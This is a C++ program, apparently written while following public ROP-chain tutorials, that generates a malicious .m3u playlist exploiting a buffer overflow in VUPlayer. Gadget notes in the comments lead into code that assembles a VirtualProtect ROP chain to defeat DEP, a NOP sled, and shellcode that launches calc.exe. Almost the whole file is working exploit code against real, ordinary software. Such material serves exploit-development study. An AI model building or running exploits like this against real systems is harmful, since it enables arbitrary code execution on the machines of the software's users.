#include "C:\\BE\\includes.h"
#include <fstream>

/*
	---------------------------------------------------------------------------------------

	BIG THANKS FOR: (I follow the tutorial he make)
	https://h0mbre.github.io/Creating_Win32_ROP_Chains/#

	And for:
	http://www.fuzzysecurity.com/tutorials/expDev/7.html

	---------------------------------------------------------------------------------------
*/


/*

Found commands (All modules), item 8143
		 Address=		10101008  ->  "\x08\x10\x10\x10"
		 Disassembly=	RETN
		 Module Name=	C:\Program Files\VUPlayer\BASSWMA.dll

---------------------------------------------------------------------

VirtualProtect : 0x1060e25c : kernel32.virtualprotect | 0x770e2e15 |  {PAGE_EXECUTE_READWRITE} [BASSMIDI.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSMIDI.dll)
				 "\x5c\xe2\x60\x10"

-----------------------

	Structure:                                 Parameters:

	BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
		_In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
		_In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x201)
		_In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
		_Out_  PDWORD lpflOldProtect       =>    A writable pointer
	);

-----------------------

	GOALS
		EAX 90909090 => Nop 
		ECX <writeable pointer> => lpflOldProtect (Random Writeable address : 101053E4)
		EDX 00000040 => flNewProtect (64 DEC = 40 HEX)
		EBX 00000201 => dwSize
		ESP ???????? => Leave as is
		EBP ???????? => Call to ESP (jmp, call, push,..)
		ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
		EDI 10101008 => ROP-Nop same as EIP

EAX:
	0x10015fe7 (RVA : 0x00015fe7) : # POP EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
	"\xe7\x5f\x01\x10"

ECX:
	0x10101007 (RVA : 0x00001007) : # POP ECX # RETN    ** [BASSWMA.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
	"\x07\x10\x10\x10"

EDX:
	
    1. zero out EAX
    2. add 4 to EAX until it reaches 0x40 (64 DEC = 40 HEX | 16 * 4 = 64h = 40d) 
    3. swap values between EAX and EDX so that EDX holds our goal value

	1.
		0x106074f8 (RVA : 0x000074f8) : # XOR EAX,EAX # RETN ** [BASSMIDI.dll] ** | {PAGE_EXECUTE_READWRITE}
		"\xf8\x74\x60\x10"

	2.
		0x10014474 (RVA : 0x00014474) : # ADD EAX,4 # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
		"\x74\x44\x01\x10"

	3.
		0x10038a6c (RVA : 0x00038a6c) : # XCHG EAX,EDX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
		"\x6c\x8a\x03\x10"

EBX:
	

	1. POP 0x994801bc into EAX
	2. XOR EAX with (static address) 0x994803BD giving us an EAX value of 0x201
	3. swap EAX and EBX so that EBX holds our desired goal value

	1. 
		0x10015fe7 (RVA : 0x00015fe7) : # POP EAX # RETN
		"\xe7\x5f\x01\x10"

		We will pop this value into EAX: 994801bc  -> "\xbc\x01\x48\x99"

	2.
		0x1003a074 (RVA : 0x0003a074) : # XOR EAX,994803BD # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
		"\x74\xa0\x03\x10"

	3.
		0x10032f32 (RVA : 0x00032f32) : # XCHG EAX,EBX # RETN 0x00    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
		"\x32\x2f\x03\x10"

EBP:
	
	0x10017c0d (RVA : 0x00017c0d) : # POP EBP # RETN 0x04 ** [BASS.dll] ** |  ascii {PAGE_EXECUTE_READWRITE}
	"\x0d\x7c\x01\x10"

	0x100222c5 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False
	"\xc5\x22\x02\x10"
		
ESI:
	
    1. POP pointer to API into EAX
    2. move the DWORD value held at the address into EAX
    3. exchange EAX and ESI

	1.
		0x10015fe7 (RVA : 0x00015fe7) : # POP EAX # RETN
		"\xe7\x5f\x01\x10"

		We will pop the VirtualProtect Address into EAX: 0x1060E25C  ->  "\x5c\xe2\x60\x10"

	2.
		0x1001eaf1 (RVA : 0x0001eaf1) : # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
		"\xf1\xea\x01\x10"

	3.
		0x10030950 (RVA : 0x00030950) : # XCHG EAX,ESI # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
		"\x50\x09\x03\x10"

EDI:

	0x100190b0 (RVA : 0x000190b0) : # POP EDI # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
	"\xb0\x90\x01\x10"

	10101008  ->  "\x08\x10\x10\x10" # ROP NOP

PUSHAD (END):

	0x1001d7a5 (RVA : 0x0001d7a5) : # PUSHAD # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
	"\xa5\xd7\x01\x10"



*/

int main()
{
	std::ofstream file("vuplayer-dep.m3u");
	
	// Generating A's
	int offset = 1012;
	std::string A = MultipleString("A", offset);

	// EAX Chunk Affects: EAX
	std::string eax = "\xe7\x5f\x01\x10"; // a pointer to # POP EAX # RETN
	eax += "\x90\x90\x90\x90";

	// ECX Chunk Affects: ECX
	std::string ecx = "\x07\x10\x10\x10";
	ecx += "\xe4\x53\x10\x10"; // 101053E4 found a spot in the RWX space of BASSWMA.dll for our writeable pointer

	// EDX Chunk Affects: EAX, EDX
	std::string edx = "\xf8\x74\x60\x10"; // a pointer to # XOR EAX, EAX # RETN
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		4
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		8
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		12
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		16
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		20
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		24
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		28
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		32
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		36
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		40
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		44
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		48
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		52
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		56
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		60
	edx += "\x74\x44\x01\x10"; // a pionter to # ADD EAX, 4 # RETN		64
	edx += "\x6c\x8a\x03\x10"; // a pointer to # XCHG EAX, EDX # RETN

	// EBX Chunk Affects: EAX, EBX
	std::string ebx = "\xe7\x5f\x01\x10"; // a pointer to a # POP EAX # RETN
	ebx += "\xbc\x01\x48\x99"; // once XOR'd w the static value 994803BD, this will result in 0x201
	ebx += "\x74\xa0\x03\x10"; // a pointer to a # XOR EAX, 994803BD # RETN
	ebx += "\x32\x2f\x03\x10"; // a pointer to a # XCHG EAX,EBX # RETN 0x00

	// EBP Chunk Affects: EBP
	std::string ebp = "\x0d\x7c\x01\x10"; // a pointer to a # POP EBP # RETN 0x04
	ebp += "\xc5\x22\x02\x10"; // pointer to JMP ESP
	ebp += "\x08\x10\x10\x10"; // pointer to a ROP NOP to compensate for the RETN 0x04
	ebp += "\x08\x10\x10\x10"; // pointer to a ROP NOP to compensate for the RETN 0x04

	// ESI Chuck Affects: EAX, ESI
	std::string esi = "\xe7\x5f\x01\x10"; // a pointer to a # POP EAX # RETN
	esi += "\x5c\xe2\x60\x10"; // VirtualProtect Address
	esi += "\xf1\xea\x01\x10"; // a pointer to a # MOV EAX,DWORD PTR DS:[EAX] # RETN
	esi += "\x50\x09\x03\x10"; // a pointer to a # XCHG EAX,ESI # RETN

	// EDI Chuck Affects: EDI
	std::string edi = "\xb0\x90\x01\x10"; // a pointer to a # POP EDI # RETN
	edi += "\x08\x10\x10\x10"; // a ponter to a ROP NOP

	// PUSHAD Chuck
	std::string pushad = "\xa5\xd7\x01\x10"; // a pointer to a # PUSHAD # RETN

	// ROP

	/*
						https://h0mbre.github.io/Creating_Win32_ROP_Chains/# 
	
			" The important part to constructing our chain at this point is assembling it in an
			order so that none of our set registers get disturbed. For instance, the ESI chain
			also affects EAX. We don’t want to set EAX to our goal value and then execute the
			ESI chain and ruin EAX. Generally, we want to use the chains that use multiple registers
			first. I constructed my rop variable as follows: "
	*/

	std::string rop;
	rop =  edx;
	rop += esi;
	rop += ebx;
	rop += ebp;
	rop += edi;
	rop += eax;
	rop += ecx;
	rop += pushad;

	// Shellcode
	char calc_shellcode[] =
		"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
		"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
		"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
		"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
		"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
		"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7";

	// Generating NOP
	std::string nopsled = MultipleString("\x90", 16);

	// Generating padding
	std::string padding = MultipleString("C", (3000 - offset - 4 - nopsled.length() - (sizeof(calc_shellcode) / sizeof(calc_shellcode[0]))));

	std::string exploit = A;
	exploit += "\x08\x10\x10\x10"; // Random pointer to a RETN
	exploit += rop;
	exploit += nopsled;
	exploit += calc_shellcode;
	exploit += padding;

	file << exploit;

	return 0;
}

